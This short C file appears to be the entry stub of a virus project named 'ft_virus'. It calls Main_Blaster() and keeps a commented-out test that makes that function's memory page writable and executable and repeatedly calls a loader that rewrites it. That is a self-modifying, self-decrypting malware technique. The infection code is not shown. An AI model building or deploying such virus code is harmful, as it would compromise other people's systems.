#include "ft_virus.h"

#ifndef __NO_MAIN__
int 		main( int __attribute__((unused)) ac, char __attribute__((unused))**av)
#else
void _start(void)
#endif
{
	/*char *function_main_blaster = (void *) (((uintptr_t)&Main_Blaster) & ~(0X1000 - 1));
	char *fn = (char *)&Main_Blaster;
	Syscall3( __NR_mprotect, (long)function_main_blaster, 0X1000, PROT_READ | PROT_WRITE | PROT_EXEC);
	printf("%.2x\n", (unsigned char)*(fn+0));
	printf("%.2x\n", (unsigned char)*(fn+1));
	printf("%.2x\n", (unsigned char)*(fn+2));
	printf("%.2x\n", (unsigned char)*(fn+3));
	printf("%.2x\n", (unsigned char)*(fn+4));
	sleep(5);
	loader();
	printf("%.2x\n", (unsigned char)*(fn+0));
	printf("%.2x\n", (unsigned char)*(fn+1));
	printf("%.2x\n", (unsigned char)*(fn+2));
	printf("%.2x\n", (unsigned char)*(fn+3));
	printf("%.2x\n", (unsigned char)*(fn+4));
	sleep(5);
	loader();
	printf("%.2x\n", (unsigned char)*(fn+0));
	printf("%.2x\n", (unsigned char)*(fn+1));
	printf("%.2x\n", (unsigned char)*(fn+2));
	printf("%.2x\n", (unsigned char)*(fn+3));
	printf("%.2x\n", (unsigned char)*(fn+4));
	sleep(5);*/
	Main_Blaster();
	return (0);
}
